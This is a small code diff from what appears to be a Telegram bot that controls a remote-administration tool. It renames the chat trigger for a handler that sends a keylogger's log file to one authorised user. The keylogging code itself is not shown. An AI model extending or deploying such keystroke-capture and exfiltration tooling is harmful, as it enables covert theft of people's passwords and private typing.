@@ -23,7 +23,7 @@ from lib.System.Key_logger.key_logger_handlers import log_file_path
 from config import ALLOWED_USER_ID
 
 def key_logs_handlers(dp):
-    @dp.message(F.text.casefold().startswith("key logs"))
+    @dp.message(F.text.casefold().startswith("key logs [new]"))
     @dp.message(Command("key_logs"))
     async def send_logs(message: types.Message, state: FSMContext):
         if message.from_user.id != ALLOWED_USER_ID:
